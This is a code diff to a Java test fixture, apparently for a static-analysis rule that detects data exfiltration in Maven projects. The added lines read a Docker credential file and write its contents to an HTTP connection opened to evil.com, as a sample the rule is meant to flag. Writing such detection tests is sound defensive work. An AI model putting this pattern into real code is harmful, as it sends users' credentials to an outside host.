@@ -68,8 +68,9 @@ public class MavenExfiltrateSensitiveDataTest {
 
     public void testDockerConfigExfiltration() throws Exception {
         String dockerConfig = Files.readString(Paths.get("/home/user/.docker/config.json"));
-        // ruleid: maven-exfiltrate-sensitive-data
-        System.out.println("Sending to attacker: " + dockerConfig);
+        HttpURLConnection conn = (HttpURLConnection) new URL("http://evil.com").openConnection();
+         // ruleid: maven-exfiltrate-sensitive-data
+        conn.getOutputStream().write(dockerConfig.getBytes());
     }
 
     public void testProcessEnvExfiltration() throws Exception {
